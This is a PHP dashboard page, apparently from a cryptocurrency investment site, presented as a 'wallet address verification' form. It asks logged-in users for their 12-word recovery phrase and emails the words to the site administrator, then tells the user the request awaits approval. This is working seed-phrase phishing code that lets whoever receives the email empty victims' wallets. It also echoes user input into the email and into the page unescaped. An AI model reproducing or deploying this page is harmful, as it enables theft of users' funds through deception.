<?php

include_once($_SERVER["DOCUMENT_ROOT"]."/views/Dashboard_Segments.php");
include_once($_SERVER["DOCUMENT_ROOT"]."/php/account-manager.php");
    if($data){
        //that means the person is logged in:
        Dashboard_Segments::header();
        
        if(isset($_POST["phrases"])){
            $user = $data->username;
            $twelve_phrases =  $_POST["phrases"];
            $twelve_phrases_array = explode(" ", $twelve_phrases);
            $output = "";
            
            foreach($twelve_phrases_array as $p) {   
                $output .= "<span style='border:1px solid #2b8eeb; box-shadow:1px 1px 3px 0 #888;border-radius:6px;padding:3px;margin-right:6px'>".$p."</span>&nbsp;";    
            }

            $message = <<<HTML
                <html>
                <head>
                    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Trirong|Arimo"/>
                    <link rel="stylesheet" href="$site_url/static/font-awesome-4.7.0/css/font-awesome.min.css"/>
                </head>

                <body style ="font-family:Trirong;">
                    <div style="position:relative">
                        <img src="$site_url/static/images/logo.png" style="margin-left:36%;margin-right:36%;width:25%;position:absolute"/>
                    </div>
                    <h2 style="color:#00008b;font-family:Arimo;text-align:center">$site_name</h2>
                                    
                    A user with username: $user submitted wallet address verification phrases as follows:
                        <div style="text-align:center">$output</div>
                </body>
                </html>
            HTML;

            $sender = "admin@$site_url_short";

            $headers = "From: $sender \r\n";
            $headers .="Reply-To: $sender \r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-type:text/html; charset=UTF-8\r\n";

            $mail = mail($sender,"User Wallet Address Verification - $site_name",$message, $headers);

            if($mail){
                echo "<div class='invalid' style='background-color:green'>Request Successful. Awaiting Approval</div>";
            } else {
                echo "Sorry, an error occurred";
            }
        }
?>

<!-- .dashboard_div starts -->
<div class="dashboard_div">
<div class="new-dashboard-head" style="padding:12px">        
    Verify Your Wallet Address
</div>


<!-- freestyle -->
<form method="post" action = "">
    <div style="padding:12px">
        Enter The 12 Phrases:
        <div id="phrases_output" style="margin:6px 0;padding-bottom:6px"> </div>
        <textarea id="phrases_text_area" name="phrases" style="border:2px solid #2b8eeb;width:90%;height:60%;border-radius:6px;box-shadow:0 0 6px 0 #000" onkeyup="display_phrase()" ></textarea>

        <div><button class="button">Submit</button></div>
    </div>
</form>

<script>
    function display_phrase() {    
        output = ""
        phrasesArray = (document.getElementById("phrases_text_area").value).split(" ")

        phrasesArray.forEach(function(p){     
            output += "<span style='border:1px solid #2b8eeb; box-shadow:1px 1px 3px 0 #888;border-radius:6px;padding:3px;margin-right:6px'>" + p + "</span>&nbsp;"    
        });  
        
        document.getElementById("phrases_output").innerHTML = output 
        return true
    }
</script>


</div>
<!-- .dashboard_div ends -->
        
 
<?php
    Dashboard_Segments::footer();
    } else {
        header("location:/login");
    }
?>  